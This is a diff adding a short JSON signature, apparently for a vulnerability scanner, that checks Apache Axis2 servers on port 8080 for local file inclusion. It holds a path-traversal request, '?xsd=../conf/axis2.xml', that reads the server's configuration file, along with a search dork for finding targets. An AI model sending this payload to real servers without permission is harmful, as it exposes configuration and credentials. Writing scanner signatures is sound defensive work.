@@ -1,0 +1,17 @@
+{
+    "name": "Axis2_Local_File_Inclusion",
+    "method": "GET",
+    "port": [
+        8080
+    ],
+    "dork": "apps=Java",
+    "suffix": [
+        "/axis2/services/Version?xsd=../conf/axis2.xml"
+    ],
+    "hits": [
+        "axisconfig"
+    ],
+    "references": [
+        "https://www.exploit-db.com/exploits/12721/"
+    ]
+}
